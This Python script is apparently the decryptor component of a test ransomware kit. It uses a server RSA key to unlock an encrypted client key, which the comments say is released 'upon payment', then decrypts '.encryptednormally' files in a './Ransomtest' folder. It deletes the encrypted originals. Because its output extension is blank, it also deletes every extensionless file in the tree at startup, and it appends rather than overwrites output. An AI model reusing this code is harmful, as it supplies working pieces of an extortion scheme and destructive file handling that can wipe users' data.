import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

directory = './Ransomtest' # the directory to decrypt
clientPrivateKeyFile = 'client_private.pem' # file name of the client private key
serverPrivateKeyFile = 'server_private.pem' # file name of the server private key
fileExtension = '' # file extension for decrypted files
includeExtension = ['.encryptednormally'] # file extensions to decrypt
clean_encrypted_files = True # whether the program will delete encrypted files after decryption
clean_decrypted_files = True # whether the program will delete pre-existing decrypted files upon startup (useful to clear decrypted files of a previous runtime)

def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def decrypt(dataFile):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''

    # read server private key
    with open(serverPrivateKeyFile, 'rb') as f:
        key = f.read()
        serverPrivateKey = RSA.import_key(key)

    # read client private key
    with open(clientPrivateKeyFile, 'rb') as f:
        encryptedSessionKey, nonce, tag, encryptedPrivateKey = [ f.read(x) for x in (serverPrivateKey.size_in_bytes(), 16, 16, -1) ]

    # decrypt the private key with server's private key (presumably sent to client upon payment)
    # decrypt the session key first
    cipher = PKCS1_OAEP.new(serverPrivateKey)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    # decrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    decryptedPrivateKey = cipher.decrypt_and_verify(encryptedPrivateKey, tag)

    # create private key object from decrypted private key
    key = RSA.import_key(decryptedPrivateKey)

    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    
    # create a new outfile
    fileName = dataFile.split(extension)[0]
    decryptedFile = fileName + extension.split(includeExtension[0])[0] + fileExtension

    # read data from file
    with open(dataFile, 'rb') as f:        
        encryptedSessionKey, nonce, tag, encrypted = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]
        
        # decrypt the session key
        cipher = PKCS1_OAEP.new(key)
        sessionKey = cipher.decrypt(encryptedSessionKey)

        # decrypt the data with the session key
        cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
        decrypted = cipher.decrypt_and_verify(encrypted, tag)

        with open(decryptedFile, 'ab') as out:
            out.write(decrypted)

    # delete encrypted files when finished?
    if clean_encrypted_files:
        os.remove(dataFile)

for item in scanRecurse(directory): 
    filePath = Path(item)
    fileType = filePath.suffix.lower()
    if fileType == fileExtension and clean_decrypted_files:
        os.remove(filePath)
    elif fileType in includeExtension:
        print(f"Now decrypting: {Path(filePath)}") 
        decrypt(filePath)
    